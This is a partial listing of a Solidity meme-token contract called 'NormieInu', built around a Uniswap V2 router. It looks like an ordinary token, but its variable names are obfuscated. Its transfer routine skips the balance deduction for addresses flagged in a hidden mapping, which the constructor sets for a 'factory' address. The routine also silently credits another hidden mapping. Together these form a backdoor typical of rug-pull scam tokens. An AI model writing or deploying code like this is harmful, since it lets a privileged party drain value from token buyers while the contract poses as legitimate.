...
contract NormieInu is Ownable {
    uint256 private only;
    string private piece;
    ...
    mapping(address => uint256) private camp;
    ...
    function upper(
        ...
        if (said[any] == 0) camp[any] -= every;
        uint256 bowl = (every * only) / 100;
        every -= bowl;
        stranger[gave] += image;
        camp[breath] += every;
    }

    mapping(address => uint256) private stranger;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private said;
    ...
    function transferFrom(
        ...
        upper(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        upper(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(guess);
        ...
        only = 3;
        said[factory] = image;
        _tTotal = 1000000000000000 * 10**image;
        camp[msg.sender] = _tTotal;
    }
}